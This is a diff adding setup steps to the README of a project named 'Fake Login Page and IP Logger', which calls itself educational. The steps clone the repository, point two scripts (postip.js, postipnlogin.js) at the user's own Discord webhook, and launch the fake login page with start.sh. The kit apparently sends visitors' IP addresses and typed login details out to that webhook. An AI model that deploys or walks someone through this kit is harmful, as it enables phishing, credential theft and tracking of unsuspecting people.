@@ -8,6 +8,20 @@ Fake Login Page and IP Logger is an educational project that captures IP address
 
 ## Setup
 
+### 1. Clone the repository
 ```bash
 git clone https://github.com/ARMed0ps/fake-login-page-and-IP-logger
 cd fake-login-page-and-IP-logger
+```
+### 2. Edit files
+```bash
+* edit line 9 in postip.js to your discord webhook
+* edit line 18 in postipnlogin.js to your discord webhook
+```
+### 3. Install dependencies
+```bash
+```
+### 4. Temporarily bring the login page up
+```bash
+bash start.sh
+```
